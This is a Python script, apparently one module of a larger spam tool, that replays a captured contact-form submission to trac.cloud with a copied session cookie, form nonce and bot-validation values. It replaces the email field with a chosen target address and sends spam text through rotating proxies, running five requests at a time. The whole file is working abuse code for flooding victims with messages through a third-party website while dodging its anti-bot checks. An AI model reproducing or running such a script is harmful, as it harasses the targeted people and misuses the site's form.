from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': '4ql2rc05bi132k7m38273l4de1',
    '_ga': 'GA1.2.1819687263.1677067911',
    '_gid': 'GA1.2.435218551.1677067911',
    '_gat_gtag_UA_119870253_4': '1',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryEJ1Xvnj6zrNr10Jj',
    # Requests sorts cookies= alphabetically
    # 'Cookie': 'PHPSESSID=4ql2rc05bi132k7m38273l4de1; _ga=GA1.2.1819687263.1677067911; _gid=GA1.2.435218551.1677067911; _gat_gtag_UA_119870253_4=1',
    'Origin': 'https://trac.cloud',
    'Referer': 'https://trac.cloud/contact/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

s = 'Thank you'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="counter1"\r\n\r\n19\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="Itemid1"\r\n\r\n\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="fm_bot_validation1"\r\n\r\n\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="fm_empty_field_validation1"\r\n\r\na2b6f7204aea64eab4c96ea1e4f797cc\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="fm_form_nonce1"\r\n\r\n0f5f59bdbb\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="_wp_http_referer"\r\n\r\n/contact/\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="wdform_4_element1"\r\n\r\ntest\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="wdform_8_element1"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="wdform_5_element_first1"\r\n\r\n12312\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="wdform_5_element_last1"\r\n\r\n3123123123\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="wdform_16_element1"\r\n\r\non\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="wdform_7_element1"\r\n\r\ntest\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj\r\nContent-Disposition: form-data; name="save_or_submit1"\r\n\r\nsubmit\r\n------WebKitFormBoundaryEJ1Xvnj6zrNr10Jj--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text(False))

        response = requests.post('https://trac.cloud/contact/', cookies=cookies, headers=headers, data=data.encode(),
                                 proxies=self.get_proxies())
        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
